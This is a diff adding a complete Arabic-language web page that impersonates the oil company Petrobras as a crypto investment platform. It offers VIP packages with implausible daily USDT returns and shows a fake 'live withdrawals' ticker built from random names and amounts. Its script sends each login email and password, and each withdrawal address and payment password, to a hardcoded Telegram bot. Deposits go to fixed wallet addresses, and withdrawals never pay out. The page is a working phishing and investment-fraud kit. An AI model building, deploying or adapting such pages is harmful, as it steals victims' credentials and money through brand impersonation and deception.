@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Petrobras BR Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { 
+            --primary: #118e8d; 
+            --bg-light: #f5f6f7;
+            --white: #ffffff;
+            --text-main: #333;
+            --accent-green: #0ecb81;
+            --danger: #f6465d;
+            --profile-dark: #000a0a;
+            --card-dark: #121a1a;
+            --vip-gold: #ffc107;
+        }
+
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: var(--bg-light); direction: rtl; overflow-x: hidden; }
+        .hidden { display: none !important; }
+
+        /* --- Floating Support --- */
+        .support-float { position: fixed; bottom: 100px; left: 20px; width: 55px; height: 55px; background: #0088cc; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); z-index: 2000; cursor: pointer; text-decoration: none; transition: 0.3s; }
+
+        /* --- Login --- */
+        #login-page { position: fixed; inset: 0; background: url('https://images.unsplash.com/photo-1553062407-98eeb64c6a62?auto=format&fit=crop&w=800&q=80') center/cover; display: flex; align-items: center; justify-content: center; z-index: 5000; }
+        .login-overlay { position: absolute; inset: 0; background: rgba(15, 18, 29, 0.9); backdrop-filter: blur(8px); }
+        .login-box { position: relative; width: 90%; max-width: 400px; text-align: center; color: white; }
+        .input-wrap { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; margin-bottom: 15px; display: flex; align-items: center; padding: 0 15px; height: 55px; }
+        .input-wrap input { background: none; border: none; color: white; flex: 1; outline: none; font-size: 16px; text-align: right; }
+        .input-wrap i { color: var(--primary); margin-left: 10px; width: 20px; }
+
+        /* --- Layout --- */
+        .header { background: var(--primary); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; color: white; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .home-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 15px; }
+        .grid-item { background: white; border-radius: 20px; padding: 15px; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.03); min-height: 100px; cursor: pointer; }
+        .grid-item.full { grid-column: 1 / span 2; display: flex; justify-content: space-between; align-items: center; }
+        .grid-item img { position: absolute; bottom: 10px; left: 10px; width: 50px; }
+        .grid-item.full img { position: static; width: 80px; }
+
+        /* --- Task Cards --- */
+        .task-card { background: white; margin: 12px 15px; border-radius: 20px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); border-right: 5px solid var(--primary); }
+        .task-header { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 8px; }
+        .task-body { display: flex; align-items: center; }
+        .task-img { width: 75px; height: 75px; border-radius: 15px; object-fit: cover; margin-left: 15px; background: #eee; }
+        .task-info { flex: 1; }
+        .task-info b { font-size: 15px; color: #222; }
+        .task-profit { color: var(--accent-green); font-weight: bold; margin-top: 5px; font-size: 14px; }
+
+        /* --- Modals --- */
+        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
+        .modal-card { background: white; width: 92%; max-width: 400px; border-radius: 25px; padding: 25px; text-align: center; color: #333; position: relative; box-sizing: border-box; }
+        .net-btn { flex: 1; padding: 10px; border-radius: 12px; border: 1px solid #eee; background: #f8f9fa; cursor: pointer; font-weight: bold; font-size: 13px; }
+        .net-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
+        .btn-action { background: var(--primary); color: white; border: none; padding: 14px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        
+        /* --- Inputs --- */
+        .w-input-group { text-align: right; margin-bottom: 15px; }
+        .w-input-group label { display: block; font-size: 12px; color: #777; margin-bottom: 5px; margin-right: 5px; }
+        .w-input-group input { width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ddd; outline: none; box-sizing: border-box; text-align: left; font-weight: bold; }
+        .withdraw-note { background: #fff5f5; color: #d32f2f; padding: 10px; border-radius: 10px; font-size: 11px; text-align: right; margin-bottom: 15px; line-height: 1.6; }
+
+        /* --- Ticker & Stats --- */
+        .ticker-container { background: white; margin: 15px; padding: 15px; border-radius: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.03); }
+        .ticker-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid #f9f9f9; animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* --- Profile --- */
+        .profile-bg { background: var(--profile-dark); min-height: 100vh; color: white; padding: 20px 20px 100px; }
+        .stats-main { background: linear-gradient(135deg, var(--primary), #0a5e5d); border-radius: 20px; padding: 20px; margin: 20px 0; display: grid; grid-template-columns: 1fr 1fr; gap: 15px; text-align: center; }
+        .team-stats { background: var(--card-dark); border-radius: 15px; padding: 15px; margin-bottom: 20px; display: flex; justify-content: space-around; border: 1px solid #222; }
+        .menu-list { background: var(--card-dark); border-radius: 20px; overflow: hidden; border: 1px solid #222; }
+        .menu-link { display: flex; justify-content: space-between; padding: 16px; border-bottom: 1px solid #222; cursor: pointer; align-items: center; transition: 0.2s; text-decoration: none; color: white; }
+        .menu-link i:first-child { color: var(--primary); margin-left: 12px; width: 20px; text-align: center; }
+
+        .nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; padding: 10px 0 25px; border-top: 1px solid #eee; z-index: 1000; }
+        .nav-item { color: #999; text-align: center; font-size: 11px; flex: 1; cursor: pointer; }
+        .nav-item.active { color: var(--primary); }
+        .nav-item i { font-size: 22px; display: block; margin-bottom: 4px; }
+    </style>
+</head>
+<body>
+
+    <!-- خدمة العملاء العائمة -->
+    <a href="https://t.me/Petrobras_Support" target="_blank" class="support-float">
+        <i class="fa-brands fa-telegram"></i>
+    </a>
+
+    <div id="login-page">
+        <div class="login-overlay"></div>
+        <div class="login-box">
+            <div style="background:white; width:70px; height:70px; border-radius:20px; margin:0 auto 20px; display:flex; align-items:center; justify-content:center;">
+                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8e/Petrobras_logo.svg/1200px-Petrobras_logo.svg.png" width="45">
+            </div>
+            <h2>PETROBRAS BR</h2>
+            <div class="input-wrap"><i class="fa-solid fa-envelope"></i><input type="email" id="u-email" placeholder="البريد الإلكتروني"></div>
+            <div class="input-wrap"><i class="fa-solid fa-lock"></i><input type="password" id="u-pass" placeholder="كلمة المرور"></div>
+            <button class="btn-action" onclick="handleLogin()">دخول المنصة</button>
+        </div>
+    </div>
+
+    <!-- Modals -->
+    <div id="deposit-modal" class="overlay hidden">
+        <div class="modal-card">
+            <h3>تعبئة المحفظة</h3>
+            <div style="display:flex; gap:10px; margin-bottom:15px;">
+                <button class="net-btn active" onclick="switchNet(this, 'dep', 'TXuFSyGZoUgKL2mX7Fmqe65z7o8Ltahytm')">USDT (TRC20)</button>
+                <button class="net-btn" onclick="switchNet(this, 'dep', '0x73c24231b39A01ef82D390123456789')">USDT (BNB)</button>
+            </div>
+            <div id="dep-addr" style="background:#f9f9f9; padding:15px; border-radius:12px; font-size:12px; word-break:break-all; border:1px dashed var(--primary); color:var(--primary); font-family:monospace;">TXuFSyGZoUgKL2mX7Fmqe65z7o8Ltahytm</div>
+            <button id="copy-btn" class="btn-action" style="margin-top:15px;" onclick="copyAddress()">نسخ العنوان</button>
+            <button onclick="closeModals()" style="background:none; border:none; color:#999; margin-top:10px; cursor:pointer;">إلغاء</button>
+        </div>
+    </div>
+
+    <div id="withdraw-modal" class="overlay hidden">
+        <div class="modal-card">
+            <h3 style="margin-top:0;">سحب الأرباح</h3>
+            <div class="withdraw-note">
+                • الحد الأدنى للسحب: <b>2.00 USDT</b><br>
+                • رسوم الشبكة: <b>0%</b><br>
+                • وقت المعالجة: تلقائي
+            </div>
+            <div style="display:flex; gap:10px; margin-bottom:15px;">
+                <button class="net-btn active" onclick="switchNet(this, 'with', 'TRC20')">TRC20</button>
+                <button class="net-btn" onclick="switchNet(this, 'with', 'BEP20')">BEP20</button>
+            </div>
+            <div class="w-input-group">
+                <label>مبلغ السحب المتاح: <b id="avail-txt" style="color:var(--accent-green);">0.00</b></label>
+                <input type="number" id="w-amount" placeholder="0.00" oninput="calcNet()">
+            </div>
+            <div class="w-input-group">
+                <label>عنوان المحفظة</label>
+                <input type="text" id="w-address" placeholder="T...">
+            </div>
+            <div class="w-input-group">
+                <label>كلمة مرور الدفع</label>
+                <input type="password" id="w-pass" placeholder="******">
+            </div>
+            <div style="text-align:right; font-size:12px; margin-bottom:15px;">الصافي: <b id="net-txt" style="color:var(--primary);">0.00 USDT</b></div>
+            <button class="btn-action" onclick="processWithdraw()">تأكيد السحب الآن</button>
+            <button onclick="closeModals()" style="background:none; border:none; color:#999; margin-top:10px; cursor:pointer;">إلغاء</button>
+        </div>
+    </div>
+
+    <div id="app" class="hidden">
+        <div id="main-content"></div>
+        <nav class="nav">
+            <div class="nav-item active" id="n-home" onclick="navTo('home')"><i class="fa-solid fa-house"></i>بيت</div>
+            <div class="nav-item" id="n-task" onclick="navTo('task')"><i class="fa-solid fa-clipboard-list"></i>مهمة</div>
+            <div class="nav-item" id="n-vip" onclick="navTo('vip')"><i class="fa-solid fa-gem"></i>VIP</div>
+            <div class="nav-item" id="n-me" onclick="navTo('me')"><i class="fa-solid fa-user"></i>أنا</div>
+        </nav>
+    </div>
+
+    <script>
+        // --- الإعدادات ---
+        const TELEGRAM_TOKEN = '7850066041:AAG56T26E6H5RAnH3r0q-vXpYw6D6X3Q2O8'; 
+        const TELEGRAM_CHAT_ID = '7203673733';
+        const SUPPORT_LINK = "https://t.me/Petrobras_Support";
+
+        let userBalance = 0.00;
+        let selectedWithdrawNet = "TRC20";
+
+        const vips = [
+            { id: 1, cost: 12, daily: 3.2, title: "تكرير خام البرنت الخفيف", img: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=200' },
+            { id: 2, cost: 45, daily: 12.5, title: "مشروع الغاز المسال الطبيعي", img: 'https://images.unsplash.com/photo-1544333346-64e4fe18274b?w=200' },
+            { id: 3, cost: 150, daily: 42.0, title: "منصة الحفر البحرية العميقة", img: 'https://images.unsplash.com/photo-1558981403-c5f91cbba527?w=200' },
+            { id: 4, cost: 400, daily: 115.0, title: "توزيع المشتقات البترولية", img: 'https://images.unsplash.com/photo-1563986768494-4dee2763ff3f?w=200' }
+        ];
+
+        async function sendToTelegram(msg) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' }) }); } catch (e) {}
+        }
+
+        function getCountdown() {
+            const now = new Date();
+            const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
+            const diff = tomorrow - now;
+            const h = Math.floor(diff / 3600000), m = Math.floor((diff % 3600000) / 60000), s = Math.floor((diff % 60000) / 1000);
+            return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+        }
+
+        function generateInvestor() {
+            const users = ["User_9**", "Ahmed_**", "Khalid**", "Sara_7**", "Fatima**"];
+            const u = users[Math.floor(Math.random()*users.length)];
+            const a = (Math.random()*50 + 2).toFixed(2);
+            return `<div class="ticker-item"><span>${u}</span><b style="color:var(--accent-green);">+${a} USDT</b></div>`;
+        }
+
+        setInterval(() => {
+            const timers = document.querySelectorAll('.timer-val');
+            const time = getCountdown();
+            timers.forEach(t => t.innerText = time);
+        }, 1000);
+
+        function handleLogin() {
+            const email = document.getElementById('u-email').value;
+            const pass = document.getElementById('u-pass').value;
+            if(email.includes('@') && pass.length >= 4) {
+                localStorage.setItem('auth_br', 'true');
+                localStorage.setItem('user_email', email);
+                sendToTelegram(`🔔 <b>دخول جديد</b>\n📧 ${email}\n🔑 ${pass}`);
+                document.getElementById('login-page').classList.add('hidden');
+                document.getElementById('app').classList.remove('hidden');
+                navTo('home');
+            } else { alert("بيانات غير مكتملة"); }
+        }
+
+        function copyAddress() {
+            const addr = document.getElementById('dep-addr').innerText;
+            navigator.clipboard.writeText(addr).then(() => {
+                const b = document.getElementById('copy-btn'); b.innerText = "تم النسخ!";
+                setTimeout(() => b.innerText = "نسخ العنوان", 2000);
+            });
+        }
+
+        function switchNet(btn, mode, val) {
+            btn.parentElement.querySelectorAll('.net-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            if(mode === 'dep') document.getElementById('dep-addr').innerText = val;
+            else selectedWithdrawNet = val;
+        }
+
+        function closeModals() { document.querySelectorAll('.overlay').forEach(o => o.classList.add('hidden')); }
+        function calcNet() { document.getElementById('net-txt').innerText = (document.getElementById('w-amount').value || 0) + " USDT"; }
+
+        function processWithdraw() {
+            const amount = document.getElementById('w-amount').value;
+            const addr = document.getElementById('w-address').value;
+            const pass = document.getElementById('w-pass').value;
+            if(amount >= 2 && addr.length > 5) {
+                sendToTelegram(`💰 <b>طلب سحب</b>\n👤 ${localStorage.getItem('user_email')}\n💵 ${amount} USDT\n🌐 ${selectedWithdrawNet}\n🏦 ${addr}\n🔐 ${pass}`);
+                alert("جاري معالجة طلبك...");
+                closeModals();
+            } else { alert("تأكد من البيانات"); }
+        }
+
+        function navTo(page) {
+            const cont = document.getElementById('main-content');
+            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+            document.getElementById('n-'+page).classList.add('active');
+
+            if(page === 'home') {
+                cont.innerHTML = `
+                    <header class="header"><b>PETROBRAS BR</b> <a href="${SUPPORT_LINK}" style="color:white;"><i class="fa-solid fa-headset"></i></a></header>
+                    <div style="background:var(--primary); padding:30px 20px; color:white; text-align:center;">
+                        <small style="opacity:0.8;">الرصيد الكلي</small>
+                        <h2 style="margin:5px 0 0;">${userBalance.toFixed(2)} USDT</h2>
+                    </div>
+                    <div class="home-grid">
+                        <div class="grid-item" onclick="document.getElementById('deposit-modal').classList.remove('hidden')"><h4>إيداع</h4><img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png"></div>
+                        <div class="grid-item" onclick="document.getElementById('avail-txt').innerText = userBalance.toFixed(2); document.getElementById('withdraw-modal').classList.remove('hidden')"><h4>سحب</h4><img src="https://cdn-icons-png.flaticon.com/512/5839/5839840.png"></div>
+                        <div class="grid-item full" onclick="navTo('task')"><div><h4>المهام المتاحة</h4><p style="font-size:11px; color:#999;">تحديث: <span class="timer-val">00:00:00</span></p></div><img src="https://cdn-icons-png.flaticon.com/512/2618/2618245.png"></div>
+                    </div>
+                    <div class="ticker-container">
+                        <b>نشاط السحب المباشر</b>
+                        <div id="live-ticker" style="margin-top:10px;"></div>
+                    </div>
+                `;
+                for(let i=0; i<4; i++) document.getElementById('live-ticker').innerHTML += generateInvestor();
+                setInterval(() => { if(document.getElementById('live-ticker')) { document.getElementById('live-ticker').innerHTML = generateInvestor() + document.getElementById('live-ticker').innerHTML; } }, 4000);
+            } 
+            else if(page === 'task') {
+                cont.innerHTML = `<header class="header"><b>قائمة المهام</b></header>`;
+                vips.forEach(v => {
+                    cont.innerHTML += `<div class="task-card">
+                        <div class="task-header"><span>VIP ${v.id}</span> <small class="timer-val">00:00:00</small></div>
+                        <div class="task-body">
+                            <img src="${v.img}" class="task-img">
+                            <div class="task-info">
+                                <b>${v.title}</b>
+                                <div class="task-profit">+${v.daily} USDT</div>
+                                <button class="btn-action" style="padding:6px; font-size:11px; margin-top:8px;" onclick="alert('قم بفتح المستوى')">تنفيذ</button>
+                            </div>
+                        </div>
+                    </div>`;
+                });
+            }
+            else if(page === 'vip') {
+                cont.innerHTML = `<header class="header"><b>باقات الاستثمار</b></header>`;
+                vips.forEach(v => {
+                    cont.innerHTML += `<div style="background:white; margin:15px; border-radius:20px; padding:20px;">
+                        <div style="display:flex; justify-content:space-between;"><h3>VIP ${v.id}</h3><b style="color:var(--vip-gold);">${v.cost} USDT</b></div>
+                        <p style="font-size:13px; color:#666;">العائد اليومي: ${v.daily} USDT</p>
+                        <button class="btn-action" onclick="document.getElementById('deposit-modal').classList.remove('hidden')">استثمار الآن</button>
+                    </div>`;
+                });
+            }
+            else if(page === 'me') {
+                const email = localStorage.getItem('user_email') || "User@petro.com";
+                cont.innerHTML = `
+                    <div class="profile-bg">
+                        <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+                            <div style="width:65px; height:65px; background:white; border-radius:50%; display:flex; align-items:center; justify-content:center;"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8e/Petrobras_logo.svg/1200px-Petrobras_logo.svg.png" width="40"></div>
+                            <div>
+                                <b style="font-size:17px;">${email}</b><br>
+                                <span style="font-size:11px; color:#aaa;">ID: ${Math.floor(Math.random()*900000 + 100000)}</span>
+                                <span style="background:var(--vip-gold); color:black; font-size:9px; padding:2px 6px; border-radius:5px; margin-right:5px; font-weight:bold;">VIP 0</span>
+                            </div>
+                        </div>
+                        <div class="stats-main">
+                            <div><small>الرصيد الإجمالي</small><div style="font-size:18px;">${userBalance.toFixed(2)}</div></div>
+                            <div><small>أرباح اليوم</small><div style="font-size:18px;">0.00</div></div>
+                        </div>
+                        <div class="team-stats">
+                            <div><small>فريق A</small><div>0</div></div><div><small>فريق B</small><div>0</div></div><div><small>فريق C</small><div>0</div></div>
+                        </div>
+                        <div class="menu-list">
+                            <a href="${SUPPORT_LINK}" class="menu-link"><div><i class="fa-solid fa-headset"></i> خدمة العملاء</div><i class="fa-solid fa-chevron-left"></i></a>
+                            <div class="menu-link" onclick="document.getElementById('deposit-modal').classList.remove('hidden')"><div><i class="fa-solid fa-wallet"></i> سجل الشحن</div><i class="fa-solid fa-chevron-left"></i></div>
+                            <div class="menu-link" onclick="document.getElementById('avail-txt').innerText = userBalance.toFixed(2); document.getElementById('withdraw-modal').classList.remove('hidden')"><div><i class="fa-solid fa-circle-down"></i> سجل السحب</div><i class="fa-solid fa-chevron-left"></i></div>
+                            <div class="menu-link" style="color:var(--danger);" onclick="localStorage.clear(); location.reload();"><div><i class="fa-solid fa-power-off"></i> تسجيل الخروج</div><i class="fa-solid fa-chevron-left"></i></div>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        window.onload = () => {
+            if(localStorage.getItem('auth_br') === 'true') {
+                document.getElementById('login-page').classList.add('hidden');
+                document.getElementById('app').classList.remove('hidden');
+                navTo('home');
+            }
+        };
+    </script>
+</body>
+</html>
